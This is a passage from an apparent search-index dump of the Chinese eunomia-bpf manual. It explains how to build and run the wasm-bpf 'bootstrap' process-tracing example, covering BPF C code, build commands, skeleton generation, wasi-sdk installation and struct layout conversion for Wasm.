\u4f60\u53ef\u4ee5\u6307\u5b9a\u8981\u8bb0\u5f55\u7684\u8fdb\u7a0b\u7684\u6700\u5c0f\u6301\u7eed\u65f6\u95f4\u3002</p> <p><code>bootstrap</code> \u662f\u5728 libbpf-bootstrap \u4e2d\uff0c\u6839\u636e BCC \u8f6f\u4ef6\u5305\u4e2d\u7684libbpf-tools\u7684\u7c7b\u4f3c\u601d\u60f3\u521b\u5efa\u7684\uff0c\u4f46\u5b83\u88ab\u8bbe\u8ba1\u6210\u66f4\u72ec\u7acb\u7684\uff0c\u5e76\u4e14\u6709\u66f4\u7b80\u5355\u7684 Makefile \u4ee5\u7b80\u5316\u7528\u6237\u7684\u7279\u6b8a\u9700\u6c42\u3002\u5b83\u6f14\u793a\u4e86\u5178\u578b\u7684BPF\u7279\u6027\uff0c\u5305\u542b\u4f7f\u7528\u591a\u4e2a BPF \u7a0b\u5e8f\u6bb5\u8fdb\u884c\u5408\u4f5c\uff0c\u4f7f\u7528 BPF map \u6765\u7ef4\u62a4\u72b6\u6001\uff0c\u4f7f\u7528 BPF ring buffer \u6765\u53d1\u9001\u6570\u636e\u5230\u7528\u6237\u7a7a\u95f4\uff0c\u4ee5\u53ca\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u6765\u53c2\u6570\u5316\u5e94\u7528\u7a0b\u5e8f\u884c\u4e3a\u3002</p> <p>\u4ee5\u4e0b\u662f\u6211\u4eec\u4f7f\u7528 Wasm \u7f16\u8bd1\u8fd0\u884c <code>bootstrap</code> \u7684\u4e00\u4e2a\u8f93\u51fa\u793a\u4f8b\uff1a</p> <pre><code>$ sudo sudo ./wasm-bpf bootstrap.wasm -h\nBPF bootstrap demo application.\n\nIt traces process start and exits and shows associated\ninformation (filename, process duration, PID and PPID, etc).\n\nUSAGE: ./bootstrap [-d &lt;min-duration-ms&gt;] -v\n$ sudo ./wasm-bpf bootstrap.wasm\nTIME     EVENT COMM             PID     PPID    FILENAME/EXIT CODE\n18:57:58 EXEC  sed              74911   74910   /usr/bin/sed\n18:57:58 EXIT  sed              74911   74910   [0] (2ms)\n18:57:58 EXIT  cat              74912   74910   [0] (0ms)\n18:57:58 EXEC  cat              74913   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74913   74910   [0] (0ms)\n18:57:59 EXEC  cat              74914   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74914   74910   [0] (0ms)\n18:57:59 EXEC  cat              74915   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74915   74910   [0] (1ms)\n18:57:59 EXEC  sleep            74916   74910   /usr/bin/sleep\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u63d0\u4f9b\u4e0e libbpf-bootstrap \u5f00\u53d1\u76f8\u4f3c\u7684\u5f00\u53d1\u4f53\u9a8c\u3002\u53ea\u9700\u8fd0\u884c make \u5373\u53ef\u6784\u5efa wasm \u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a</p> <pre><code>git clone https://github.com/eunomia-bpf/wasm-bpf --recursive\ncd examples/bootstrap\nmake\n</code></pre>"},{"location":"eunomia-bpf/manual/#ebpf","title":"\u7f16\u5199\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f","text":"<p>\u8981\u6784\u5efa\u4e00\u4e2a\u5b8c\u6574\u7684 eBPF \u7a0b\u5e8f\uff0c\u9996\u5148\u8981\u7f16\u5199\u5185\u6838\u6001\u7684 bpf \u4ee3\u7801\u3002\u901a\u5e38\u4f7f\u7528 C \u8bed\u8a00\u7f16\u5199\uff0c\u5e76\u4f7f\u7528 clang \u5b8c\u6210\u7f16\u8bd1\uff1a</p> <pre><code>char LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, pid_t);\n    __type(value, u64);\n} exec_start SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nconst volatile unsigned long long min_duration_ns = 0;\nconst volatile int *name_ptr;\n\nSEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n    struct task_struct *task;\n    unsigned fname_off;\n    struct event *e;\n    pid_t pid;\n    u64 ts;\n....\n</code></pre> <p>\u53d7\u7bc7\u5e45\u6240\u9650\uff0c\u8fd9\u91cc\u6ca1\u6709\u8d34\u51fa\u5b8c\u6574\u7684\u4ee3\u7801\u3002\u5185\u6838\u6001\u4ee3\u7801\u7684\u7f16\u5199\u65b9\u5f0f\u548c\u5176\u4ed6\u57fa\u4e8e libbpf \u7684\u7a0b\u5e8f\u5b8c\u5168\u76f8\u540c\uff0c\u4e00\u822c\u6765\u8bf4\u4f1a\u5305\u542b\u4e00\u4e9b\u5168\u5c40\u53d8\u91cf\uff0c\u901a\u8fc7 <code>SEC</code> \u58f0\u660e\u6302\u8f7d\u70b9\u7684 eBPF \u51fd\u6570\uff0c\u4ee5\u53ca\u7528\u4e8e\u4fdd\u5b58\u72b6\u6001\uff0c\u6216\u8005\u5728\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u4e4b\u95f4\u76f8\u4e92\u901a\u4fe1\u7684 map \u5bf9\u8c61\uff08\u6211\u4eec\u8fd8\u5728\u8fdb\u884c\u53e6\u5916\u4e00\u9879\u5de5\u4f5c\uff1abcc to libbpf converter\uff0c\u7b49\u5b83\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u7f16\u8bd1 BCC \u98ce\u683c\u7684 eBPF \u5185\u6838\u6001\u7a0b\u5e8f\uff09\u3002\u5728\u7f16\u5199\u5b8c eBPF \u7a0b\u5e8f\u4e4b\u540e\uff0c\u8fd0\u884c <code>make</code> \u4f1a\u5728 <code>Makefile</code> \u8c03\u7528 clang \u548c llvm-strip \u6784\u5efaBPF\u7a0b\u5e8f\uff0c\u4ee5\u5265\u79bb\u8c03\u8bd5\u4fe1\u606f\uff1a</p> <pre><code>clang -g -O2 -target bpf -D__TARGET_ARCH_x86 -I../../third_party/vmlinux/x86/ -idirafter /usr/local/include -idirafter /usr/include -c bootstrap.bpf.c -o bootstrap.bpf.o\nllvm-strip -g bootstrap.bpf.o # strip useless DWARF info\n</code></pre> <p>\u4e4b\u540e\uff0c\u6211\u4eec\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u4e3a\u4e86 Wasm \u4e13\u95e8\u5b9e\u73b0\u7684 bpftool\uff0c\u7528\u4e8e\u4ece BPF \u7a0b\u5e8f\u751f\u6210C\u5934\u6587\u4ef6\uff1a</p> <pre><code>../../third_party/bpftool/src/bpftool gen skeleton -j bootstrap.bpf.o &gt; bootstrap.skel.h\n</code></pre> <p>\u7531\u4e8e eBPF \u672c\u8eab\u7684\u6240\u6709 C \u5185\u5b58\u5e03\u5c40\u662f\u548c\u5f53\u524d\u6240\u5728\u673a\u5668\u7684\u6307\u4ee4\u96c6\u4e00\u6837\u7684\uff0c\u4f46\u662f wasm \u662f\u6709\u4e00\u5957\u786e\u5b9a\u7684\u5185\u5b58\u5e03\u5c40\uff08\u6bd4\u5982\u5f53\u524d\u6240\u5728\u673a\u5668\u662f 64 \u4f4d\u7684\uff0cWasm \u865a\u62df\u673a\u91cc\u9762\u662f 32 \u4f4d\u7684\uff0cC struct layout \u3001\u6307\u9488\u5bbd\u5ea6\u3001\u5927\u5c0f\u7aef\u7b49\u7b49\u90fd\u53ef\u80fd\u4e0d\u4e00\u6837\uff09\uff0c\u4e3a\u4e86\u786e\u4fdd eBPF \u7a0b\u5e8f\u80fd\u6b63\u786e\u548c Wasm \u4e4b\u95f4\u8fdb\u884c\u76f8\u4e92\u901a\u4fe1\uff0c\u6211\u4eec\u9700\u8981\u5b9a\u5236\u4e00\u4e2a\u4e13\u95e8\u7684 bpftool \u7b49\u5de5\u5177\uff0c\u5b9e\u73b0\u6b63\u786e\u751f\u6210\u53ef\u4ee5\u5728 Wasm \u4e2d\u5de5\u4f5c\u7684\u7528\u6237\u6001\u5f00\u53d1\u6846\u67b6\u3002</p> <p>skel \u5305\u542b\u4e00\u4e2a BPF \u7a0b\u5e8f\u7684skeleton\uff0c\u7528\u4e8e\u64cd\u4f5c BPF \u5bf9\u8c61\uff0c\u5e76\u63a7\u5236 BPF \u7a0b\u5e8f\u7684\u751f\u547d\u5468\u671f\uff0c\u4f8b\u5982\uff1a</p> <pre><code>    struct bootstrap_bpf {\n        struct bpf_object_skeleton *skeleton;\n        struct bpf_object *obj;\n        struct {\n            struct bpf_map *exec_start;\n            struct bpf_map *rb;\n            struct bpf_map *rodata;\n        } maps;\n        struct {\n            struct bpf_program *handle_exec;\n            struct bpf_program *handle_exit;\n        } progs;\n        struct bootstrap_bpf__rodata {\n            unsigned long long min_duration_ns;\n        } *rodata;\n        struct bootstrap_bpf__bss {\n            uint64_t /* pointer */ name_ptr;\n        } *bss;\n    };\n</code></pre> <p>\u6211\u4eec\u4f1a\u5c06\u6240\u6709\u6307\u9488\u90fd\u5c06\u6839\u636e eBPF \u7a0b\u5e8f\u76ee\u6807\u6240\u5728\u7684\u6307\u4ee4\u96c6\u7684\u6307\u9488\u5927\u5c0f\u8f6c\u6362\u4e3a\u6574\u6570\uff0c\u4f8b\u5982\uff0c<code>name_ptr</code>\u3002\u6b64\u5916\uff0c\u586b\u5145\u5b57\u8282\u5c06\u660e\u786e\u6dfb\u52a0\u5230\u7ed3\u6784\u4f53\u4e2d\u4ee5\u786e\u4fdd\u7ed3\u6784\u4f53\u5e03\u5c40\u4e0e\u76ee\u6807\u7aef\u76f8\u540c\uff0c\u4f8b\u5982\u4f7f\u7528 <code>char __pad0[4];</code>\u3002\u6211\u4eec\u8fd8\u4f1a\u4f7f\u7528 <code>static_assert</code> \u6765\u786e\u4fdd\u7ed3\u6784\u4f53\u7684\u5185\u5b58\u957f\u5ea6\u548c\u539f\u5148 BTF \u4fe1\u606f\u4e2d\u7684\u7c7b\u578b\u957f\u5ea6\u76f8\u540c\u3002</p>"},{"location":"eunomia-bpf/manual/#wasm","title":"\u6784\u5efa\u7528\u6237\u6001\u7684 Wasm \u4ee3\u7801\uff0c\u5e76\u83b7\u53d6\u5185\u6838\u6001\u6570\u636e","text":"<p>libbpf \u662f\u4e00\u4e2a C/C++ \u7684 eBPF \u7528\u6237\u6001\u52a0\u8f7d\u548c\u63a7\u5236\u5e93\uff0c\u968f\u7740\u5185\u6838\u4e00\u8d77\u5206\u53d1\uff0c\u51e0\u4e4e\u5df2\u7ecf\u6210\u4e3a eBPF \u7528\u6237\u6001\u4e8b\u5b9e\u4e0a\u7684 API \u6807\u51c6\uff0clibbpf \u4e5f\u652f\u6301 CO-RE(Compile Once \u2013 Run Everywhere) \u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5373\u9884\u7f16\u8bd1\u7684 bpf \u4ee3\u7801\u53ef\u4ee5\u5728\u4e0d\u540c\u5185\u6838\u7248\u672c\u4e0a\u6b63\u5e38\u5de5\u4f5c\uff0c\u800c\u65e0\u9700\u4e3a\u6bcf\u4e2a\u7279\u5b9a\u5185\u6838\u91cd\u65b0\u7f16\u8bd1\u3002\u6211\u4eec\u5e0c\u671b\u5c3d\u53ef\u80fd\u7684\u4fdd\u6301\u4e0e libbpf \u7684\u7528\u6237\u6001 API \u4ee5\u53ca\u884c\u4e3a\u4e00\u81f4\uff0c\u5c3d\u53ef\u80fd\u51cf\u5c11\u5e94\u7528\u8fc1\u79fb\u5230 Wasm \uff08\u5982\u679c\u9700\u8981\u7684\u8bdd\uff09\u7684\u6210\u672c\u3002</p> <p>libbpf-bootstrap \u4e3a\u751f\u6210\u57fa\u4e8e libbpf \u7684 bpf \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u6a21\u677f,\u5f00\u53d1\u8005\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u4f7f\u7528\u8be5\u6a21\u677f\u751f\u6210\u81ea\u5b9a\u4e49\u7684 bpf \u7a0b\u5e8f\u3002\u4e00\u822c\u8bf4\u6765\uff0c\u5728\u975e Wasm \u6c99\u7bb1\u7684\u7528\u6237\u6001\u7a7a\u95f4\uff0c\u4f7f\u7528 libbpf-bootstrap \u811a\u624b\u67b6\uff0c\u53ef\u4ee5\u5feb\u901f\u3001\u8f7b\u677e\u5730\u4f7f\u7528 C/C++\u6784\u5efa BPF \u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u7f16\u8bd1\u3001\u6784\u5efa\u548c\u8fd0\u884c eBPF \u7a0b\u5e8f\uff08\u65e0\u8bba\u662f\u91c7\u7528\u4ec0\u4e48\u8bed\u8a00\uff09\uff0c\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u7f16\u5199\u5185\u6838\u6001 eBPF \u7a0b\u5e8f\u7684\u4ee3\u7801\uff0c\u4e00\u822c\u4f7f\u7528 C/C++ \u6216 Rust \u8bed\u8a00</li> <li>\u4f7f\u7528 clang \u7f16\u8bd1\u5668\u6216\u8005\u76f8\u5173\u5de5\u5177\u94fe\u7f16\u8bd1 eBPF \u7a0b\u5e8f\uff08\u8981\u5b9e\u73b0\u8de8\u5185\u6838\u7248\u672c\u79fb\u690d\u7684\u8bdd\uff0c\u9700\u8981\u5305\u542b BTF \u4fe1\u606f\uff09\u3002</li> <li>\u5728\u7528\u6237\u6001\u7684\u5f00\u53d1\u7a0b\u5e8f\u4e2d\uff0c\u7f16\u5199\u5bf9\u5e94\u7684\u52a0\u8f7d\u3001\u63a7\u5236\u3001\u6302\u8f7d\u3001\u6570\u636e\u5904\u7406\u903b\u8f91\uff1b</li> <li>\u5728\u5b9e\u9645\u8fd0\u884c\u7684\u9636\u6bb5\uff0c\u4ece\u7528\u6237\u6001\u5c06 eBPF \u7a0b\u5e8f\u52a0\u8f7d\u8fdb\u5165\u5185\u6838\uff0c\u5e76\u5b9e\u9645\u6267\u884c\u3002</li> </ul>"},{"location":"eunomia-bpf/manual/#bootstrap_1","title":"bootstrap","text":"<p><code>bootstrap</code>\u662f\u4e00\u4e2a\u7b80\u5355\uff08\u4f46\u5b9e\u7528\uff09\u7684BPF\u5e94\u7528\u7a0b\u5e8f\u7684\u4f8b\u5b50\u3002\u5b83\u8ddf\u8e2a\u8fdb\u7a0b\u7684\u542f\u52a8\uff08\u51c6\u786e\u5730\u8bf4\uff0c\u662f <code>exec()</code> \u7cfb\u5217\u7684\u7cfb\u7edf\u8c03\u7528\uff09\u548c\u9000\u51fa\uff0c\u5e76\u53d1\u9001\u5173\u4e8e\u6587\u4ef6\u540d\u3001PID \u548c \u7236 PID \u7684\u6570\u636e\uff0c\u4ee5\u53ca\u9000\u51fa\u72b6\u6001\u548c\u8fdb\u7a0b\u7684\u6301\u7eed\u65f6\u95f4\u3002\u7528<code>-d &lt;min-duration-ms&gt;</code> \u4f60\u53ef\u4ee5\u6307\u5b9a\u8981\u8bb0\u5f55\u7684\u8fdb\u7a0b\u7684\u6700\u5c0f\u6301\u7eed\u65f6\u95f4\u3002</p> <p><code>bootstrap</code> \u662f\u5728 libbpf-bootstrap \u4e2d\uff0c\u6839\u636e BCC \u8f6f\u4ef6\u5305\u4e2d\u7684libbpf-tools\u7684\u7c7b\u4f3c\u601d\u60f3\u521b\u5efa\u7684\uff0c\u4f46\u5b83\u88ab\u8bbe\u8ba1\u6210\u66f4\u72ec\u7acb\u7684\uff0c\u5e76\u4e14\u6709\u66f4\u7b80\u5355\u7684 Makefile \u4ee5\u7b80\u5316\u7528\u6237\u7684\u7279\u6b8a\u9700\u6c42\u3002\u5b83\u6f14\u793a\u4e86\u5178\u578b\u7684BPF\u7279\u6027\uff0c\u5305\u542b\u4f7f\u7528\u591a\u4e2a BPF \u7a0b\u5e8f\u6bb5\u8fdb\u884c\u5408\u4f5c\uff0c\u4f7f\u7528 BPF map \u6765\u7ef4\u62a4\u72b6\u6001\uff0c\u4f7f\u7528 BPF ring buffer \u6765\u53d1\u9001\u6570\u636e\u5230\u7528\u6237\u7a7a\u95f4\uff0c\u4ee5\u53ca\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u6765\u53c2\u6570\u5316\u5e94\u7528\u7a0b\u5e8f\u884c\u4e3a\u3002</p> <p>\u4ee5\u4e0b\u662f\u6211\u4eec\u4f7f\u7528 Wasm \u7f16\u8bd1\u8fd0\u884c <code>bootstrap</code> \u7684\u4e00\u4e2a\u8f93\u51fa\u793a\u4f8b\uff1a</p> <pre><code>$ sudo sudo ./wasm-bpf bootstrap.wasm -h\nBPF bootstrap demo application.\n\nIt traces process start and exits and shows associated\ninformation (filename, process duration, PID and PPID, etc).\n\nUSAGE: ./bootstrap [-d &lt;min-duration-ms&gt;] -v\n$ sudo ./wasm-bpf bootstrap.wasm\nTIME     EVENT COMM             PID     PPID    FILENAME/EXIT CODE\n18:57:58 EXEC  sed              74911   74910   /usr/bin/sed\n18:57:58 EXIT  sed              74911   74910   [0] (2ms)\n18:57:58 EXIT  cat              74912   74910   [0] (0ms)\n18:57:58 EXEC  cat              74913   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74913   74910   [0] (0ms)\n18:57:59 EXEC  cat              74914   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74914   74910   [0] (0ms)\n18:57:59 EXEC  cat              74915   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74915   74910   [0] (1ms)\n18:57:59 EXEC  sleep            74916   74910   /usr/bin/sleep\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u63d0\u4f9b\u4e0e libbpf-bootstrap \u5f00\u53d1\u76f8\u4f3c\u7684\u5f00\u53d1\u4f53\u9a8c\u3002\u53ea\u9700\u8fd0\u884c make \u5373\u53ef\u6784\u5efa wasm \u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a</p> <pre><code>git clone https://github.com/eunomia-bpf/wasm-bpf --recursive\ncd examples/bootstrap\nmake\n</code></pre>"},{"location":"eunomia-bpf/manual/#ebpf_1","title":"\u7f16\u5199\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f","text":"<p>\u8981\u6784\u5efa\u4e00\u4e2a\u5b8c\u6574\u7684 eBPF \u7a0b\u5e8f\uff0c\u9996\u5148\u8981\u7f16\u5199\u5185\u6838\u6001\u7684 bpf \u4ee3\u7801\u3002\u901a\u5e38\u4f7f\u7528 C \u8bed\u8a00\u7f16\u5199\uff0c\u5e76\u4f7f\u7528 clang \u5b8c\u6210\u7f16\u8bd1\uff1a</p> <pre><code>char LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, pid_t);\n    __type(value, u64);\n} exec_start SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nconst volatile unsigned long long min_duration_ns = 0;\nconst volatile int *name_ptr;\n\nSEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n    struct task_struct *task;\n    unsigned fname_off;\n    struct event *e;\n    pid_t pid;\n    u64 ts;\n....\n</code></pre> <p>\u53d7\u7bc7\u5e45\u6240\u9650\uff0c\u8fd9\u91cc\u6ca1\u6709\u8d34\u51fa\u5b8c\u6574\u7684\u4ee3\u7801\u3002\u5185\u6838\u6001\u4ee3\u7801\u7684\u7f16\u5199\u65b9\u5f0f\u548c\u5176\u4ed6\u57fa\u4e8e libbpf \u7684\u7a0b\u5e8f\u5b8c\u5168\u76f8\u540c\uff0c\u4e00\u822c\u6765\u8bf4\u4f1a\u5305\u542b\u4e00\u4e9b\u5168\u5c40\u53d8\u91cf\uff0c\u901a\u8fc7 <code>SEC</code> \u58f0\u660e\u6302\u8f7d\u70b9\u7684 eBPF \u51fd\u6570\uff0c\u4ee5\u53ca\u7528\u4e8e\u4fdd\u5b58\u72b6\u6001\uff0c\u6216\u8005\u5728\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u4e4b\u95f4\u76f8\u4e92\u901a\u4fe1\u7684 map \u5bf9\u8c61\uff08\u6211\u4eec\u8fd8\u5728\u8fdb\u884c\u53e6\u5916\u4e00\u9879\u5de5\u4f5c\uff1abcc to libbpf converter\uff0c\u7b49\u5b83\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u7f16\u8bd1 BCC \u98ce\u683c\u7684 eBPF \u5185\u6838\u6001\u7a0b\u5e8f\uff09\u3002\u5728\u7f16\u5199\u5b8c eBPF \u7a0b\u5e8f\u4e4b\u540e\uff0c\u8fd0\u884c <code>make</code> \u4f1a\u5728 <code>Makefile</code> \u8c03\u7528 clang \u548c llvm-strip \u6784\u5efaBPF\u7a0b\u5e8f\uff0c\u4ee5\u5265\u79bb\u8c03\u8bd5\u4fe1\u606f\uff1a</p> <pre><code>clang -g -O2 -target bpf -D__TARGET_ARCH_x86 -I../../third_party/vmlinux/x86/ -idirafter /usr/local/include -idirafter /usr/include -c bootstrap.bpf.c -o bootstrap.bpf.o\nllvm-strip -g bootstrap.bpf.o # strip useless DWARF info\n</code></pre> <p>\u4e4b\u540e\uff0c\u6211\u4eec\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u4e3a\u4e86 Wasm \u4e13\u95e8\u5b9e\u73b0\u7684 bpftool\uff0c\u7528\u4e8e\u4ece BPF \u7a0b\u5e8f\u751f\u6210C\u5934\u6587\u4ef6\uff1a</p> <pre><code>../../third_party/bpftool/src/bpftool gen skeleton -j bootstrap.bpf.o &gt; bootstrap.skel.h\n</code></pre> <p>\u7531\u4e8e eBPF \u672c\u8eab\u7684\u6240\u6709 C \u5185\u5b58\u5e03\u5c40\u662f\u548c\u5f53\u524d\u6240\u5728\u673a\u5668\u7684\u6307\u4ee4\u96c6\u4e00\u6837\u7684\uff0c\u4f46\u662f wasm \u662f\u6709\u4e00\u5957\u786e\u5b9a\u7684\u5185\u5b58\u5e03\u5c40\uff08\u6bd4\u5982\u5f53\u524d\u6240\u5728\u673a\u5668\u662f 64 \u4f4d\u7684\uff0cWasm \u865a\u62df\u673a\u91cc\u9762\u662f 32 \u4f4d\u7684\uff0cC struct layout \u3001\u6307\u9488\u5bbd\u5ea6\u3001\u5927\u5c0f\u7aef\u7b49\u7b49\u90fd\u53ef\u80fd\u4e0d\u4e00\u6837\uff09\uff0c\u4e3a\u4e86\u786e\u4fdd eBPF \u7a0b\u5e8f\u80fd\u6b63\u786e\u548c Wasm \u4e4b\u95f4\u8fdb\u884c\u76f8\u4e92\u901a\u4fe1\uff0c\u6211\u4eec\u9700\u8981\u5b9a\u5236\u4e00\u4e2a\u4e13\u95e8\u7684 bpftool \u7b49\u5de5\u5177\uff0c\u5b9e\u73b0\u6b63\u786e\u751f\u6210\u53ef\u4ee5\u5728 Wasm \u4e2d\u5de5\u4f5c\u7684\u7528\u6237\u6001\u5f00\u53d1\u6846\u67b6\u3002</p> <p>skel \u5305\u542b\u4e00\u4e2a BPF \u7a0b\u5e8f\u7684skeleton\uff0c\u7528\u4e8e\u64cd\u4f5c BPF \u5bf9\u8c61\uff0c\u5e76\u63a7\u5236 BPF \u7a0b\u5e8f\u7684\u751f\u547d\u5468\u671f\uff0c\u4f8b\u5982\uff1a</p> <pre><code>    struct bootstrap_bpf {\n        struct bpf_object_skeleton *skeleton;\n        struct bpf_object *obj;\n        struct {\n            struct bpf_map *exec_start;\n            struct bpf_map *rb;\n            struct bpf_map *rodata;\n        } maps;\n        struct {\n            struct bpf_program *handle_exec;\n            struct bpf_program *handle_exit;\n        } progs;\n        struct bootstrap_bpf__rodata {\n            unsigned long long min_duration_ns;\n        } *rodata;\n        struct bootstrap_bpf__bss {\n            uint64_t /* pointer */ name_ptr;\n        } *bss;\n    };\n</code></pre> <p>\u6211\u4eec\u4f1a\u5c06\u6240\u6709\u6307\u9488\u90fd\u5c06\u6839\u636e eBPF \u7a0b\u5e8f\u76ee\u6807\u6240\u5728\u7684\u6307\u4ee4\u96c6\u7684\u6307\u9488\u5927\u5c0f\u8f6c\u6362\u4e3a\u6574\u6570\uff0c\u4f8b\u5982\uff0c<code>name_ptr</code>\u3002\u6b64\u5916\uff0c\u586b\u5145\u5b57\u8282\u5c06\u660e\u786e\u6dfb\u52a0\u5230\u7ed3\u6784\u4f53\u4e2d\u4ee5\u786e\u4fdd\u7ed3\u6784\u4f53\u5e03\u5c40\u4e0e\u76ee\u6807\u7aef\u76f8\u540c\uff0c\u4f8b\u5982\u4f7f\u7528 <code>char __pad0[4];</code>\u3002\u6211\u4eec\u8fd8\u4f1a\u4f7f\u7528 <code>static_assert</code> \u6765\u786e\u4fdd\u7ed3\u6784\u4f53\u7684\u5185\u5b58\u957f\u5ea6\u548c\u539f\u5148 BTF \u4fe1\u606f\u4e2d\u7684\u7c7b\u578b\u957f\u5ea6\u76f8\u540c\u3002</p>"},{"location":"eunomia-bpf/manual/#wasm_1","title":"\u6784\u5efa\u7528\u6237\u6001\u7684 Wasm \u4ee3\u7801\uff0c\u5e76\u83b7\u53d6\u5185\u6838\u6001\u6570\u636e","text":"<p>\u6211\u4eec\u9ed8\u8ba4\u4f7f\u7528 wasi-sdk \u4ece C/C++ \u4ee3\u7801\u6784\u5efa wasm \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528 emcc \u5de5\u5177\u94fe\u6765\u6784\u5efa wasm \u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u547d\u4ee4\u5e94\u8be5\u662f\u76f8\u4f3c\u7684\u3002\u60a8\u53ef\u4ee5\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u5b89\u88c5 wasi-sdk\uff1a</p> <pre><code>wget https://github.com/WebAssembly/wasi-sdk/releases/download/wasi-sdk-17/wasi-sdk-17.0-linux.tar.gz\ntar -zxf wasi-sdk-17.0-linux.tar.gz\nsudo mkdir -p /opt/wasi-sdk/ &amp;&amp; sudo mv wasi-sdk-17.0/* /opt/wasi-sdk/\n</code></pre> <p>\u7136\u540e\u8fd0\u884c <code>make</code> \u4f1a\u5728 <code>Makefile</code> \u4e2d\u4f7f\u7528 wasi-clang \u7f16\u8bd1 C \u4ee3\u7801\uff0c\u751f\u6210 Wasm \u5b57\u8282\u7801\uff1a</p> <pre><code>/opt/wasi-sdk/bin/clang -O2 --sysroot=/opt/wasi-sdk/share/wasi-sysroot -Wl,--allow-undefined -o bootstrap.wasm bootstrap.c\n</code></pre> <p>\u7531\u4e8e\u5bbf\u4e3b\u673a\uff08\u6216 eBPF \u7aef\uff09\u7684 C \u7ed3\u6784\u5e03\u5c40\u53ef\u80fd\u4e0e\u76ee\u6807\uff08Wasm \u7aef\uff09\u7684\u7ed3\u6784\u5e03\u5c40\u4e0d\u540c\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5\u4f7f\u7528 ecc \u548c\u6211\u4eec\u7684 wasm-bpftool \u751f\u6210\u7528\u6237\u7a7a\u95f4\u4ee3\u7801\u7684 C \u5934\u6587\u4ef6\uff1a</p> <pre><code>ecc bootstrap.h --header-only\n../../third_party/bpftool/src/bpftool btf dump file bootstrap.bpf.o format c -j &gt; bootstrap.wasm.h\n</code></pre> <p>\u4f8b\u5982\uff0c\u539f\u5148\u5185\u6838\u6001\u7684\u5934\u6587\u4ef6\u4e2d\u7ed3\u6784\u4f53\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>struct event {\n    int pid;\n    int ppid;\n    unsigned exit_code;\n    unsigned long long duration_ns;\n    char comm[TASK_COMM_LEN];\n    char filename[MAX_FILENAME_LEN];\n    char exit_event;\n};\n</code></pre> <p>\u6211\u4eec\u7684\u5de5\u5177\u4f1a\u5c06\u5176\u8f6c\u6362\u4e3a\uff1a</p> <pre><code>struct event {\n    int pid;\n    int ppid;\n    unsigned int exit_code;\n    char __pad0[4];\n    unsigned long long duration_ns;\n    char comm[16];\n    char filename[127];\n    char exit_event;\n} __attribute__((packed));\nstatic_assert(sizeof(struct event) == 168, \"Size of event is not 168\");\n</code></pre> <p>\u6ce8\u610f\uff1a\u6b64\u8fc7\u7a0b\u548c\u5de5\u5177\u5e76\u4e0d\u603b\u662f\u5fc5\u9700\u7684\uff0c\u5bf9\u4e8e\u7b80\u5355\u7684\u5e94\u7528\uff0c\u4f60\u53ef\u4ee5\u624b\u52a8\u5b8c\u6210\u3002\u5bf9\u4e8e\u5185\u6838\u6001\u548c Wasm \u5e94\u7528\u90fd\u4f7f\u7528 C/C++ \u8bed\u8a00\u7684\u60c5\u51b5\u4e0b\uff0c\u4f60\u53ef\u4ee5\u624b\u52a8\u7f16\u5199\u6240\u6709\u4e8b\u4ef6\u7ed3\u6784\u4f53\u5b9a\u4e49\uff0c\u4f7f\u7528 <code>__attribute__((packed))</code> \u907f\u514d\u586b\u5145\u5b57\u8282\uff0c\u5e76\u5728\u4e3b\u673a\u548c wasm \u7aef\u4e4b\u95f4\u8f6c\u6362\u6240\u6709\u6307\u9488\u4e3a\u6b63\u786e\u7684\u6574\u6570\u3002\u6240\u6709\u7c7b\u578b\u5fc5\u987b\u5728 wasm \u4e2d\u5b9a\u4e49\u4e0e\u4e3b\u673a\u7aef\u76f8\u540c\u7684\u5927\u5c0f\u548c\u5e03\u5c40\u3002</p> 